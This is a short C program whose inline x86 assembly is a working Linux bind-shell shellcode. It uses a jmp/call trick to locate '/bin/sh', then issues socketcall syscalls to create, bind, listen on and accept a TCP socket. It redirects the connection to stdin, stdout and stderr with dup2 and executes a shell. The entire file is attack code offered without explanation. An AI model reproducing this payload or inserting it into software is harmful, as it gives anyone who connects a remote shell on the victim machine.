int main()
{
  asm ("jmp line
start:
    popl %esi

/* socket(AF_INET, SOCK_STREAM, 0) */
    xorl %eax, %eax 
    movl %eax, 0x10(%esi) 
    incl %eax 
    movl %eax, %ebx 
    movl %eax, 0x0c(%esi) 
    incl %eax 
    movl %eax, 0x08(%esi) 
    leal 0x08(%esi), %ecx 
    movb $0x66, %al 
    int $0x80 

/* bind(sd, (struct sockaddr *)&servaddr, sizeof(servaddr)) */
    incl %ebx
    movb $0x10, 0x10(%esi)
    movw %bx, 0x14(%esi)
    movb %al, 0x08(%esi)
    xorl %eax, %eax
    movl %eax, %edx 
    movl %eax, 0x18(%esi)
    movb $0x77, %al 
    movw %ax, 0x16(%esi)
    leal 0x14(%esi), %ecx 
    movl %ecx, 0x0c(%esi)
    leal 0x08(%esi), %ecx
    movb $0x66, %al 
    int $0x80

/* listen(sd, 1) */
    movl %ebx, 0x0c(%esi)
    incl %ebx
    incl %ebx
    movb $0x66, %al
    int $0x80

/* accept(sd, NULL, 0) */
    movl %edx, 0x0c(%esi)
    movl %edx, 0x10(%esi)
    movb $0x66, %al
    incl %ebx
    int $0x80

/* dup2(cli, 0) */
    xchgb %al, %bl
    movb $0x3f, %al
    xorl %ecx, %ecx
    int $0x80

/* dup2(cli, 1) */
    movb $0x3f, %al 
    incl %ecx 
    int $0x80

/* dup2(cli, 2) */
    movb $0x3f, %al 
    incl %ecx 
    int $0x80 

/* execl() */
    movb %dl, 0x07(%esi) 
    movl %esi, 0x0c(%esi) 
    xchgl %esi, %ebx 
    leal 0x0c(%ebx), %ecx 
    movb $0x0b, %al 
    int $0x80

line:
    call start
    .string \"/bin/sh\"
  ");
}
